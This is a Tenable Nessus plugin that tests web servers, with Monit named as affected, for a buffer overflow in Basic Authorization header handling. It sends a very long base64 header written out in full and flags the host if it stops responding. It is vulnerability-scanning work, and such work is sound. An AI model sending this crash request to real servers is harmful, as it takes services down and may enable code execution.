#
# (C) Tenable Network Security, Inc.

# Affected:
# Monit
# 

include("compat.inc");

if(description)
{
 script_id(12201);
 script_version ("$Revision: 1.12 $");

 script_name(english:"Web Server HTTP Basic Authorization Header Remote Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web server with a remote buffer overflow
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending a request with a long
basic authentication field.

A remote attacker may exploit this vulnerability to make the web server
crash continually or even execute arbitrary code." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version or protect it with a filtering reverse proxy" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_summary(english:"Attempts to overflow the basic authentication buffer");
 script_category(ACT_DENIAL);	# Should be ACT_DESTRUCTIVE_ATTACK
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencies("httpver.nasl", "http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

####
include("global_settings.inc");
include ("misc_func.inc");
include ("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

w = http_send_recv3(port: port, method:"GET", item: "/",
  add_headers: make_array("Authorization", 
'Basic ' +
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYOlhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY'+
'WFhYWFhYWFhYWFhYWFg=') );

if (http_is_dead(port: port, retry: 3)) security_hole(port);

